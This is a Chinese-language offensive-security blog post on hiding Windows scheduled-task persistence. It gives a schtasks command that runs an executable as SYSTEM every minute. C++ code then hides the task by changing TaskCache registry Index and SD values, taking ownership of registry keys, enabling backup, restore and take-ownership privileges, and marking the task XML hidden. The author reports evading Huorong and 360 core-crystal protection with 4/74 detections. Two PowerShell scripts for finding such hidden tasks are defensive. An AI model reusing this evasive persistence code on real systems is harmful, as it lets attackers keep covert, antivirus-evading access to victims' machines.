# 计划任务

核晶环境下拦截严格度从高到低以此为 sc -> 注册表 -> 计划任务

这里我们就来实现一下难度较低的计划任务 来做权限维持

常见的维权命令

```cmd
schtasks /create /sc minute /mo 1 /tn "mysqlstart" /tr c:\windows\test.exe /ru system
```

直接加会在 `%SystemRoot%\System32\Tasks` 留下相关的xml文件 

![image-20240709125016046](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202407091250172.png)

里面记录了相关的配置信息

删除改xml后计划任务依旧生效



注册表

`计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`

![image-20240711094445052](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202407110944179.png)

修改index为0后达到隐藏的效果 修改后计划任务依旧生效

`taskschd.msc`中不可见

![image-20240711102043027](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202407111020103.png)

知道名字的话还是可以通过`schtasks`来查询的

而当删除SD后只能通过注册表来排查 如果计划任务的名称取的好是比较难排查的

![image-20240711105624040](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202407111056124.png)

实际上并不是 可以通过powershell找没有SD项的注册表地址

[意大利的猫](https://cloud.tencent.com/developer/user/7676791)师傅的脚本

```powershell
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"

# 定义函数来递归获取子项并打印没有 "SD" 项的子项的注册表地址
function Get-SubKeysWithoutSD($path) {
    $subKeys = Get-ChildItem -Path $path -ErrorAction SilentlyContinue

    foreach ($subKey in $subKeys) {
        $subKeyPath = Join-Path -Path $path -ChildPath $subKey.PSChildName
        $sdValue = Get-ItemProperty -Path $subKeyPath -Name "SD" -ErrorAction SilentlyContinue

        if ($null -eq $sdValue) {
            Write-Output $subKeyPath
        }

        Get-SubKeysWithoutSD -Path $subKeyPath
    }
}

# 调用函数开始递归获取子项
Get-SubKeysWithoutSD -Path $registryPath
```

![image-20240711114144767](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202407111141805.png)

所以这里考虑修改SD 修改SD后再查询会爆拒绝访问

![image-20240714133128749](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202407141331797.png)

[意大利的猫](https://cloud.tencent.com/developer/user/7676791)师傅给出的脚本

```cpp
$start = Get-Date
$basePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"

# 获取所有计划任务
$tasks = Get-ChildItem -Path $basePath -Recurse

# 创建一个空的数组来存储找到的计划任务信息
$taskInfo = @()

# 遍历计划任务并显示路径和名称
foreach ($task in $tasks) {
    
    $taskPath = $task.PSPath.Replace("Microsoft.PowerShell.Core\Registry::", "")
    $taskName = $task.Name.Replace("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree", "")

    
    $exePath = "schtasks.exe"
    $arguments = "/query /tn ""$taskName"""

    # 执行可执行文件
    $process = Start-Process -FilePath $exePath -ArgumentList $arguments -NoNewWindow -PassThru -RedirectStandardOutput "stdout.txt" -RedirectStandardError "stderr.txt" -Wait

    # 读取执行结果
    $exitCode = $process.ExitCode
    # $stdout = Get-Content "stdout.txt"
    $stderr = Get-Content "stderr.txt"

    if ($stderr -and $stderr.Contains("错误: 拒绝访问。")) {
        $taskInfo += [PSCustomObject]@{
            "TaskName" = $taskName
            "RegistryPath" = $basePath + $taskName
        }
    }
}

# 将计划任务信息以表格形式显示
$table = $taskInfo | Format-Table -AutoSize | Out-String -Width 500
Write-Host $table

$end = Get-Date
Write-Host -ForegroundColor Red ('Total Runtime: ' + ($end - $start).TotalSeconds)
```



## 代码实现

自动化实现上面所说的行为

### 初始化 COM 并设置常规 COM 安全性

```cpp
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);;
    hr = CoInitializeSecurity(
        NULL,                             // 安全描述符
        -1,                               // 应用程序中可供 COM 使用的身份验证服务数量
        NULL,                             // 指向身份验证服务数组的指针
        NULL,                             // 保留值，通常为 NULL
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,    // 默认的身份验证级别
        RPC_C_IMP_LEVEL_IMPERSONATE,      // 默认的模拟级别
        NULL,                             // 处理自定义身份验证
        0,                                // 额外的标志
        NULL                              // 保留值，通常为 NULL
    );
```

### 随机选取计划任务名并创建计划任务

随机从当前计划任务名中选取一个 并拼接上(Manual)

根据msdn的自己改改

https://learn.microsoft.com/zh-cn/windows/win32/taskschd/time-trigger-example--c---

```cpp
bool CheckRegistryForTaskCreation() {
    HKEY hKey;
    DWORD dwDisposition;
    LONG lResult = RegCreateKeyEx(
        HKEY_LOCAL_MACHINE,
        charToLPCWSTR("SOFTWARE\\microsoft\\DXR"),
        0,
        NULL,
        0,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        &dwDisposition
    );

    if (lResult != ERROR_SUCCESS) {
        ShowErrorWithCode("Error creating/opening registry key", lResult);
        return false;
    }

    if (dwDisposition == REG_CREATED_NEW_KEY) {
        DWORD value = 1;
        RegSetValueEx(hKey, charToLPCWSTR("TaskCreated"), 0, REG_DWORD, reinterpret_cast<BYTE*>(&value), sizeof(value));
        RegCloseKey(hKey);
        return true;
    }
    else {
        DWORD value = 0;
        DWORD valueSize = sizeof(value);
        lResult = RegQueryValueEx(hKey, charToLPCWSTR("TaskCreated"), NULL, NULL, reinterpret_cast<BYTE*>(&value), &valueSize);
        RegCloseKey(hKey);
        return value == 0;
    }
}

```

这里写注册表 防止重复注册

```cpp
bool CheckRegistryForTaskCreation() {
    HKEY hKey;
    DWORD dwDisposition;
    LONG lResult = RegCreateKeyEx(
        HKEY_CURRENT_USER,
        charToLPCWSTR("SOFTWARE\\DXR"),
        0,
        NULL,
        0,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        &dwDisposition
    );

    if (lResult != ERROR_SUCCESS) {
        // ShowErrorWithCode("Error creating/opening registry key", lResult);
        return false;
    }

    if (dwDisposition == REG_CREATED_NEW_KEY) {
        DWORD value = 1;
        RegSetValueEx(hKey, charToLPCWSTR("TaskCreated"), 0, REG_DWORD, reinterpret_cast<BYTE*>(&value), sizeof(value));
        RegCloseKey(hKey);
        return true;
    }
    else {
        DWORD value = 0;
        DWORD valueSize = sizeof(value);
        lResult = RegQueryValueEx(hKey, charToLPCWSTR("TaskCreated"), NULL, NULL, reinterpret_cast<BYTE*>(&value), &valueSize);
        RegCloseKey(hKey);
        return value == 0;
    }
}
```

选择的目录是HKEY_CURRENT_USER下的 不需要administrators权限就可以写

### 隐藏计划任务对应xml文件

```cpp
void HideFile()
{

    if (!g_taskName.empty()) {
        std::wstring basePath = TEXT("C:\\Windows\\System32\\Tasks\\");
        std::wstring finalPath = basePath + g_taskName;
        LPCWSTR lpFinalPath = finalPath.c_str();  // 转换为 LPCWSTR

        DWORD currentAttributes = GetFileAttributes(lpFinalPath);

        // 设置文件属性为隐藏和系统文件
        if ((currentAttributes & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) != (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
            SetFileAttributes(lpFinalPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }
}
```

![image-20240711160810886](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202407111608256.png)

### 获取特权模式

```cpp
BOOL SetPrivilege(LPCWSTR privilege)
{
    // 64-bit only
    if (sizeof(LPVOID) != 8)
    {
        return FALSE;
    }

    // Initialize handle to process token
    HANDLE token = NULL;

    // Open our token
    if (NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &token) != 0)
    {
        return FALSE;
    }

    // Token elevation struct
    TOKEN_ELEVATION tokenElevation = { 0 };
    DWORD tokenElevationSize = sizeof(TOKEN_ELEVATION);

    // Get token elevation status
    if (NtQueryInformationToken(token, TokenElevation, &tokenElevation, sizeof(tokenElevation), &tokenElevationSize) != 0)
    {
        NtClose(token);
        return FALSE;
    }

    // Check if token is elevated
    if (!tokenElevation.TokenIsElevated)
    {
        NtClose(token);
        return FALSE;
    }

    // Lookup the LUID for the specified privilege
    LUID luid;
    if (!LookupPrivilegeValue(NULL, privilege, &luid))
    {
        NtClose(token);
        return FALSE;
    }

    // Size of token privilege struct
    DWORD tokenPrivsSize = 0;

    // Get size of current privilege array
    if (NtQueryInformationToken(token, TokenPrivileges, NULL, NULL, &tokenPrivsSize) != 0xC0000023)
    {
        NtClose(token);
        return FALSE;
    }

    // Allocate memory to store current token privileges
    PTOKEN_PRIVILEGES tokenPrivs = (PTOKEN_PRIVILEGES)new BYTE[tokenPrivsSize];

    // Get current token privileges
    if (NtQueryInformationToken(token, TokenPrivileges, tokenPrivs, tokenPrivsSize, &tokenPrivsSize) != 0)
    {
        delete tokenPrivs;
        NtClose(token);
        return FALSE;
    }

    // Track whether or not token has the specified privilege
    BOOL status = FALSE;

    // Loop through privileges assigned to token to find the specified privilege
    for (DWORD i = 0; i < tokenPrivs->PrivilegeCount; i++)
    {
        if (tokenPrivs->Privileges[i].Luid.LowPart == luid.LowPart &&
            tokenPrivs->Privileges[i].Luid.HighPart == luid.HighPart)
        {
            // Located the specified privilege, enable it if necessary
            if (!(tokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED))
            {
                tokenPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;

                // Apply updated privilege struct to token
                if (NtAdjustPrivilegesToken(token, FALSE, tokenPrivs, tokenPrivsSize, NULL, NULL) == 0)
                {
                    status = TRUE;
                }
            }
            else
            {
                status = TRUE;
            }
            break;
        }
    }

    // Free token privileges buffer
    delete tokenPrivs;

    // Close token handle
    NtClose(token);

    return status;
}
```



    SetPrivilege(SE_RESTORE_NAME);
    SetPrivilege(SE_BACKUP_NAME);
    SetPrivilege(SE_TAKE_OWNERSHIP_NAME);

### 更改注册表所有者权限

```cpp
void SetRegistryKeyOwnerAndPermissions(const std::string& keyPath) {
    PSID pSid = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;

    if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSid)) {
        return;
    }

    // 使用 SetNamedSecurityInfoA 设置所有者
    DWORD result = SetNamedSecurityInfoA(
        const_cast<LPSTR>(keyPath.c_str()), SE_REGISTRY_KEY, OWNER_SECURITY_INFORMATION,
        pSid, NULL, NULL, NULL);


    PACL pOldDACL = NULL, pNewDACL = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;

    result = GetNamedSecurityInfoA(
        keyPath.c_str(), SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION,
        NULL, NULL, &pOldDACL, NULL, &pSD);


    EXPLICIT_ACCESS ea;
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = KEY_ALL_ACCESS;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    ea.Trustee.ptstrName = (LPWSTR)pSid;

    result = SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL);
    result = SetNamedSecurityInfoA(
        const_cast<LPSTR>(keyPath.c_str()), SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION,
        NULL, NULL, pNewDACL, NULL);

    LocalFree(pSD);
    LocalFree(pNewDACL);
    FreeSid(pSid);
}
```

否则无法修改值

### 修改Index为0

```cpp
void ModifyIndex(const std::string& keyPath, DWORD newValue) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey);
    //if (result != ERROR_SUCCESS) {
    //    ShowErrorMessageBox("Error opening registry key");
    //    return;
    //}

    result = RegSetValueExA(hKey, "Index", 0, REG_DWORD, reinterpret_cast<BYTE*>(&newValue), sizeof(DWORD));
    //if (result != ERROR_SUCCESS) {
    //    ShowErrorMessageBox("Error setting registry value");
    //}
    //else {
    //    MessageBoxA(NULL, "Registry value updated successfully", "Success", MB_ICONINFORMATION | MB_OK);
    //}

    RegCloseKey(hKey);
}
```



### 修改SD为原来的一半

```cpp
void ModifySD(const std::string& keyPath) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);


    DWORD dataType;
    DWORD dataSize;
    result = RegQueryValueExA(hKey,"SD", NULL, &dataType, NULL, &dataSize);


    std::vector<BYTE> data(dataSize);
    result = RegQueryValueExA(hKey, "SD", NULL, &dataType, data.data(), &dataSize);


    // 计算前一半的数据
    dataSize /= 2;
    std::vector<BYTE> newData(data.begin(), data.begin() + dataSize);

    result = RegSetValueExA(hKey, "SD", 0, REG_BINARY, newData.data(), newData.size());

    RegCloseKey(hKey);
}
```

完整代码开源在



代码比较乱 原因有两个 一个是代码水平比较低

另一个是一开始过不了核晶 加了以前写的垃圾代码进去



## 效果

运行后添加计划任务 进行xml的隐藏 注册表的更改



VT `4/74 `过火绒 过核晶

![image-20240714131242799](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202407141312907.png)

![image-20240714131042696](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202407141310933.png)

![image-20240714131140935](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202407141311073.png)



# 参考

https://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.2_from_COM_to_UAC_bypass_and_get_SYSTEM_dirtectly.html

https://learn.microsoft.com/zh-cn/windows/win32/taskschd/time-trigger-example--c---

https://github.com/0x727/SchTask_0x727

https://cloud.tencent.com/developer/article/2377196

